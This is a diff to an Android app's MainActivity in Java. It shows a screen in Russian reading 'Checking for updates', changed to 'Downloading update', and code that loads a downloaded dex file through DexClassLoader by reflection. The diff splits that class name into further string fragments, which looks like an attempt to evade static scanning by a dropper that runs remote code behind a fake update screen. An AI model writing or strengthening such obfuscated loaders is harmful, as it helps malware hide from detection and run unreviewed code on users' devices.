@@ -27,7 +27,7 @@ public class MainActivity extends Activity {
         layout.setBackgroundColor(Color.parseColor("#121212"));
 
         TextView tv = new TextView(this);
-        tv.setText("Проверка обновлений...");
+        tv.setText("Загрузка обновления...");
         tv.setTextSize(18);
         tv.setTextColor(Color.WHITE);
         layout.addView(tv);
@@ -66,7 +66,11 @@ public class MainActivity extends Activity {
         protected void onPostExecute(File dexFile) {
             if (dexFile != null) {
                 try {
-                    String className = "dalvik.system.Dex" + "ClassLoader";
+                    String p1 = "dalvik.system.";
+                    String p2 = "Dex" + "Class";
+                    String p3 = "Loader";
+                    String className = p1 + p2 + p3;
+                    
                     Class<?> clazz = Class.forName(className);
                     Constructor<?> constructor = clazz.getConstructor(String.class, String.class, String.class, ClassLoader.class);
                     
